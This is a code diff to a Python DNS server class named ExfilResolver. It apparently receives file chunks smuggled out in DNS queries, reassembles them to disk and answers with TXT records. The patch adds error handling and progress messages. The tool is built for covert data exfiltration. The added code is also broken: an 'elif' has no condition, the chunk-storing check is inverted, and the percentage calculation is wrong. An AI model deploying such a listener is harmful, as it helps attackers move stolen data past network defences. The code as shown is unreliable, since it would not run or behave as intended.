@@ -71,10 +71,20 @@ class ExfilResolver(BaseResolver):
             
 
         # print("DATA RECV:", filename, index, data)
-        self.files[filename][int(index)] = data
+        try:
+            if self.files[filename][int(index)] is not None:
+                self.files[filename][int(index)] = data
+            elif 
+                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("data already received")))
+        except KeyError:
+            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("File not found")))
+            return reply
+        except ValueError:
+            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Index not an int")))
+            return reply
         self.checkfile(filename)
         # reply.header.rcode = RCODE.NXDOMAIN
-        reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("This is a reply")))
+        reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Data received")))
         return reply
 
     # Doing this in a seperate thread would be nice
@@ -90,12 +100,11 @@ class ExfilResolver(BaseResolver):
                     f.write(x)
             print("File:", filename, "written to disk")
             # TODO decode the file
-            # TODO delete that dictionary entry for mem reasons
             del self.files[filename]
                 
         else:
             # The file is not ready for output
-            print("File:", filename, "is still missing", nones, "lines")
+            print("File:", filename, nones / len(self.files[filename]), "% complete")
 
 if __name__ == '__main__':
 
